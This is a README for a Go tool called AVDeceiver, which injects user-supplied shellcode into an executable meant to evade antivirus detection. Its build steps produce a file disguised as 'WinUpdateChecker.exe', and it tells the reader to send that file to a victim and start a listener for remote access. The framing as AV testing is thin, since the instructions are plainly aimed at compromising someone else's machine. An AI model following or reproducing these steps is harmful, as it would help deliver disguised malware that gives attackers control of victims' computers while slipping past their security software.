# AVDeceiver - Antivirus deceive Framework . Helps to inject  shell code and testing AntiVirus . It launches with a messagebox and follows to shell code execution.

#####  AVDeceiver allows the user to inject custom shell code  .

## Getting Started

##### git clone https://github.com/diljithishere/AVDeceiver.git
##### Set go env as 32 bit 
##### set GOARCH=386
##### cd src
#### Create your shell code using msfvenom or any other methods . Assign the shell code to 'shell' variable  
### Build exe 
#### go build -o WinUpdateChecker.exe avdeceiver.go 
#### Send to your victim and set your listener
#### If your shell code works , you will get access to the victim machine according to your shell code.

### Prerequisites
#### Go 

### Built With
#### Go 

### Author
#### * **Diljith S** - *Initial work* - (https://github.com/diljithishere)